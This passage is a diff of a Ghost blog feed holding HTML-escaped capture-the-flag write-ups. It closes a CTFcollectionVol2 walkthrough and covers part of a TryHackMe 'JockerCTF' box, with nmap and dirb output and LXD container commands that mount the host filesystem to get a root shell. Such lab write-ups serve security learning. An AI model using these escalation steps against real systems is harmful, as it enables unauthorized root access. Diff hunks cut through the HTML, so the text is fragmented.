main page source code contain the flag as a png encoded to base64, decode it, and get the flag from the picture.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.19.09-1.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.21.16.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG15&lt;/blockquote&gt;&lt;p&gt;For this Flag, we will play some guessing games, don't get emotional about it, but you are going to lose some brain cells.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.23.18.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.43.53.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Each alphabet is a special hash number, guess the alphabet of each number of the hint, You'll get the flag.&lt;/p&gt;&lt;blockquote&gt;FLAG16&lt;/blockquote&gt;&lt;p&gt;Flag number 16 is very very easy, all you have to do is to click the three buttons on the browser all three at once, and you'll get the flag number 16.&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.18.07.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;use BURP!&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG17&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.53.57.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;Binary baby!&lt;/figcaption&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/VbEloWwOz3QqYBsqIZ" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/OTHERCOLORS-matrix-illusion-already-been-made-VbEloWwOz3QqYBsqIZ"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;Binary &amp;gt; Hex &amp;gt; Text&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;FLAG18&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.22.24.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Just say yes for eggs and you'll be given the flag.&lt;/p&gt;&lt;blockquote&gt;FLAG19&lt;/blockquote&gt;&lt;p&gt;For this flag, when you check the source code of the page, you see that a png image is there but it's not displayed, go get the picture, You get the flag number 19.&lt;/p&gt;&lt;blockquote&gt;FLAG20&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.25.07.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.25.29.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;And that's it for today, thank for participating in this 20Flag marathon ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/URuzvsMZNVm2wRd9K3" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/memecandy-URuzvsMZNVm2wRd9K3"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>JockerCTF | write-up</title><description>&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme it's rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jockerctf-write-up/</link><guid isPermaLink="false">5e8caabb75832c27370ae6e1</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 16:31:26 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/joker.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/joker.jpg" alt="JockerCTF | write-up"&gt;&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme it's rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.215.43 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 16:30 UTC
 Nmap scan report for ip-10-10-215-43.eu-west-1.compute.internal (10.10.215.43)
 Host is up (0.0010s latency).
@@ -602,7 +1220,7 @@ Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.31.50.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.32.05.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/12qASHliHqDPSo" width="328" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/joker-12qASHliHqDPSo"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;well well well, we have three ports &lt;strong&gt;ssh&lt;/strong&gt; on 22 and some &lt;strong&gt;apache&lt;/strong&gt; on 80 and 8080, It seems that we need credentials to access something in port 8080.&lt;/p&gt;&lt;p&gt;we'll dig more in port 80 and see if we have any interesting directories and files.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.215.43/
+&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.31.50.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.32.05.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;well well well, we have three ports &lt;strong&gt;ssh&lt;/strong&gt; on 22 and some &lt;strong&gt;apache&lt;/strong&gt; on 80 and 8080, It seems that we need credentials to access something in port 8080.&lt;/p&gt;&lt;p&gt;we'll dig more in port 80 and see if we have any interesting directories and files.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.215.43/
 
 -----------------
 DIRB v2.22    
@@ -755,7 +1373,7 @@ $ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=tr
 $ lxc start joker
 $ lxc exec ignite /bin/sh
 whoami
-root&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/p8EJ11ZuJlIxG" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/reaction-p8EJ11ZuJlIxG"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;That's it for today, stay safe, and HAPPY HACKING!&lt;/p&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;blockquote class="wp-embedded-content"&gt;&lt;a href="https://www.hackingarticles.in/lxd-privilege-escalation/"&gt;Lxd Privilege Escalation&lt;/a&gt;&lt;/blockquote&gt;
+root&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/13Iz0UAOQlWYU" width="480" height="280" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/batman-13Iz0UAOQlWYU"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;That's it for today, stay safe, and HAPPY HACKING!&lt;/p&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;blockquote class="wp-embedded-content"&gt;&lt;a href="https://www.hackingarticles.in/lxd-privilege-escalation/"&gt;Lxd Privilege Escalation&lt;/a&gt;&lt;/blockquote&gt;
 &lt;script type="text/javascript"&gt;
 &lt;!--//--&gt;&lt;![CDATA[//&gt;&lt;!--
 		/*! This file is auto-generated */
